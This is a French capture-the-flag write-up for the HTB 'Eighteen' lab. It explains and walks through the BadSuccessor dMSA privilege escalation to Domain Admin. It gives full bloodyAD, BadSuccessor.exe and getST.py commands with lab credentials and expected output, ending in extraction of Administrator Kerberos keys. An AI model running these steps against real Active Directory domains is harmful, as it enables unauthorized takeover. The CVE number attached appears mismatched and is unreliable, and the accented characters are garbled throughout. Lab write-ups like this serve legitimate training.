# Exploitation DMSA (CVE-2025-33073)

### <mark style="color:$primary;">Exploitation DMSA (CVE-2025-33073)</mark> <a href="#dmsa-exploit" id="dmsa-exploit"></a>

#### <mark style="color:$success;">6.1 Contexte de la Vuln√©rabilit√©</mark>

**CVE-2025-33073: Bad Successor Vulnerability**

* Affecte: Windows Server 2025, Windows 11 24H2
* Composant: Delegated Managed Service Accounts (dMSA)
* Impact: Escalade de privil√®ges vers Domain Admin

**Principe:**

1. Cr√©er un compte dMSA malveillant
2. Lier ce compte √† un utilisateur privil√©gi√© (Administrator)
3. H√©riter des privil√®ges via `msDS-ManagedAccountPrecededByLink`
4. Extraire le hash du compte privil√©gi√©

#### 6.2 Pr√©requis

**Permissions n√©cessaires:**

* `CreateChild` sur une OU
* Membre d'un groupe avec cette permission (IT dans notre cas)

**V√©rification:**

```bash
proxychains -q bloodyAD \
  --host DC01.eighteen.htb \
  -d eighteen.htb \
  -u 'adam.scott' \
  -p 'iloveyou1' \
  get writable
```

**R√©sultat attendu:**

```
distinguishedName: OU=Staff,DC=eighteen,DC=htb
permission: CREATE_CHILD
```

#### 6.3 Exploitation avec BadSuccessor

**T√©l√©chargement de l'outil**

```bash
# GitHub: https://github.com/YuG0rd/BadSuccessor
wget https://github.com/YuG0rd/BadSuccessor/releases/download/v1.0/BadSuccessor.exe
```

**Upload et ex√©cution**

```powershell
*Evil-WinRM* PS> upload BadSuccessor.exe
*Evil-WinRM* PS> .\BadSuccessor.exe escalate `
  -targetOU "OU=Staff,DC=eighteen,DC=htb" `
  -dmsa "BAD_DMSA2" `
  -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" `
  -dnshostname "BAD_DMSA" `
  -user "adam.scott"
```

**Param√®tres expliqu√©s:**

* `-targetOU`: OU o√π cr√©er le dMSA
* `-dmsa`: Nom du compte dMSA malveillant
* `-targetUser`: DN complet de l'utilisateur cible
* `-dnshostname`: Hostname DNS pour le dMSA
* `-user`: Utilisateur actuel (pour permissions)

**Output attendu:**

```
[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[+] Created dMSA 'BAD_DMSA2' in 'OU=Staff,DC=eighteen,DC=htb'
```

#### 6.4 R√©cup√©ration du Ticket Kerberos

**Avec getST.py (Impacket modifi√©)**

**Note:** N√©cessite version modifi√©e supportant `-dmsa` flag.

```bash
# Via Chisel/Proxychains
faketime -f '+7h' proxychains -q python getST.py \
  eighteen.htb/adam.scott:iloveyou1 \
  -impersonate 'BAD_DMSA2$' \
  -self \
  -dmsa \
  -dc-ip 10.10.11.95
```

**Options:**

* `-impersonate`: Se faire passer pour le dMSA
* `-self`: Demander ticket pour soi-m√™me
* `-dmsa`: Mode Delegated MSA
* `faketime`: Compenser clock skew

**R√©sultat:**

```
[*] Getting TGT for user
[*] Impersonating BAD_DMSA2$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:a08b77a2bfc88cffb334eced701c44ac...
[*] Saving ticket in BAD_DMSA2$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

**Export du ticket**

```bash
export KRB5CCNAME='BAD_DMSA2$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
```

***

{% hint style="info" %}
## CVE-2025-33073 : Bad Successor / DMSA Vulnerability - Explication D√©taill√©e

### üéØ C'est quoi cette vuln√©rabilit√© ?

#### En une phrase simple :

**On peut cr√©er un compte "fant√¥me" (dMSA) qui h√©rite automatiquement des privil√®ges d'un administrateur du domaine, sans avoir besoin de ses credentials.**

***

### üìö Les Concepts de Base

#### Qu'est-ce qu'un MSA (Managed Service Account) ?

**D√©finition :** Un MSA est un compte cr√©√© par Windows pour faire tourner des services (comme SQL Server, IIS, etc.) **sans avoir √† g√©rer manuellement les mots de passe**.

**Caract√©ristiques :**

* Windows change automatiquement le mot de passe tous les 30 jours
* Le mot de passe est extr√™mement complexe (240 caract√®res)
* Seul le syst√®me peut r√©cup√©rer le mot de passe
* Utilis√© pour la s√©curit√© des services

**Types de MSA :**

1. **sMSA** (Standalone MSA) : Pour un seul serveur
2. **gMSA** (Group MSA) : Pour plusieurs serveurs
3. **dMSA** (Delegated MSA) : **‚Üê NOUVEAU dans Windows Server 2025 / Windows 11 24H2**

#### Qu'est-ce qu'un dMSA (Delegated Managed Service Account) ?

**Concept :** C'est une nouvelle fonctionnalit√© de Windows Server 2025 qui permet de **migrer progressivement** un compte utilisateur classique vers un MSA.

**Sc√©nario d'utilisation l√©gitime :**

```
√âtape 1 : Vous avez un service qui tourne avec le compte "ServiceSQL"
√âtape 2 : Vous voulez migrer vers un MSA pour plus de s√©curit√©
√âtape 3 : Vous cr√©ez un dMSA qui "succ√®de" √† ServiceSQL
√âtape 4 : Pendant la migration, le dMSA h√©rite des privil√®ges de ServiceSQL
√âtape 5 : Une fois la migration termin√©e, ServiceSQL est d√©sactiv√©
```

***

### üêõ La Vuln√©rabilit√© : Pourquoi √ßa marche ?

#### Le probl√®me : msDS-ManagedAccountPrecededByLink

**Attribut magique :** `msDS-ManagedAccountPrecededByLink` permet de lier un dMSA √† un compte "pr√©d√©cesseur".

**Ce que Microsoft voulait :**

```
dMSA_SQL ‚Üí succ√®de √† ‚Üí ServiceSQL (compte de service)
```

**Ce que la vuln√©rabilit√© permet :**

```
dMSA_Malveillant ‚Üí succ√®de √† ‚Üí Administrator (compte admin domaine !)
```

#### Pourquoi c'est dangereux ?

Quand vous cr√©ez un dMSA li√© √† un compte, **le dMSA h√©rite automatiquement** :

* ‚úÖ Des m√™mes privil√®ges
* ‚úÖ Des m√™mes groupes
* ‚úÖ Des m√™mes permissions
* ‚úÖ **Et peut r√©cup√©rer les cl√©s Kerberos du compte cible !**

***

### üîë C'est quoi "CreateChild" ?

#### Permission CreateChild expliqu√©e

**D√©finition :** `CreateChild` est une permission Active Directory qui permet de **cr√©er de nouveaux objets** dans une Unit√© d'Organisation (OU).

**Analogie simple :**

```
OU = Un dossier dans Active Directory
CreateChild = Le droit de cr√©er de nouveaux fichiers dans ce dossier
```

**Dans notre cas :**

```
OU=Staff,DC=eighteen,DC=htb  ‚Üê L'OU cible
Permission: CreateChild       ‚Üê On peut cr√©er des objets dedans
```

#### Types d'objets qu'on peut cr√©er :

* Utilisateurs
* Groupes
* Ordinateurs
* **dMSA** ‚Üê Ce qui nous int√©resse !

#### Pourquoi on en a besoin ?

Parce que pour exploiter la CVE, il faut :

1. **Cr√©er** un compte dMSA malveillant
2. Dans une OU o√π on a les droits
3. Et le lier √† un compte privil√©gi√©

**Sans CreateChild** ‚Üí Impossible de cr√©er le dMSA ‚Üí Pas d'exploit

***

### üé¨ L'Exploitation √âtape par √âtape

#### Contexte du CTF Eighteen

**Ce qu'on a :**

* Utilisateur : `adam.scott`
* Groupe : `IT`
* Permission : Le groupe IT a `CreateChild` sur `OU=Staff`

**Ce qu'on veut :**

* Devenir `Administrator` (Domain Admin)

#### √âtape 1 : V√©rifier qu'on a CreateChild

```bash
proxychains -q bloodyAD \
  --host DC01.eighteen.htb \
  -d eighteen.htb \
  -u 'adam.scott' \
  -p 'iloveyou1' \
  get writable
```

**R√©sultat :**

```
distinguishedName: OU=Staff,DC=eighteen,DC=htb
permission: CREATE_CHILD  ‚Üê ON A LE DROIT !
```

**Traduction :** adam.scott (via le groupe IT) peut cr√©er des objets dans OU=Staff.

#### √âtape 2 : Cr√©er le dMSA malveillant avec BadSuccessor

```powershell
.\BadSuccessor.exe escalate \
  -targetOU "OU=Staff,DC=eighteen,DC=htb" \        # O√π cr√©er le dMSA
  -dmsa "BAD_DMSA2" \                              # Nom du dMSA malveillant
  -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" \  # Cible
  -dnshostname "BAD_DMSA" \                        # Hostname DNS
  -user "adam.scott"                               # Notre utilisateur
```

**Ce qui se passe en coulisses :**

```
1. BadSuccessor cr√©e un objet dMSA nomm√© "BAD_DMSA2$"
   
2. Il configure l'attribut msDS-ManagedAccountPrecededByLink :
   msDS-ManagedAccountPrecededByLink = "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
   
3. Il met msDS-DelegatedMSAState = 2 (√©tat "migration en cours")
   
4. Il configure msDS-GroupMSAMembership pour permettre √† adam.scott de r√©cup√©rer le mot de passe
   
5. Windows Active Directory pense que c'est une migration l√©gitime
   
6. BAD_DMSA2$ h√©rite automatiquement des privil√®ges d'Administrator !
```

**Output :**

```
[*] Creating dMSA object...
[*] Inheriting target user privileges
    ‚Üí msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    ‚Üí msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[+] Created dMSA 'BAD_DMSA2' in 'OU=Staff,DC=eighteen,DC=htb'
```

#### √âtape 3 : R√©cup√©rer le ticket Kerberos avec getST.py

**Pourquoi on fait √ßa ?**

Maintenant qu'on a un dMSA li√© √† Administrator, on peut :

1. Se faire passer pour ce dMSA (impersonation)
2. Demander un ticket Kerberos
3. Ce ticket contient les **cl√©s de chiffrement d'Administrator** !

**Commande :**

```bash
faketime -f '+7h' proxychains -q python getST.py \
  eighteen.htb/adam.scott:iloveyou1 \
  -impersonate 'BAD_DMSA2$' \              # On se fait passer pour notre dMSA
  -self \                                   # On demande un ticket pour nous-m√™me
  -dmsa \                                   # Mode dMSA (flag sp√©cial)
  -dc-ip 10.10.11.95
```
{% endhint %}
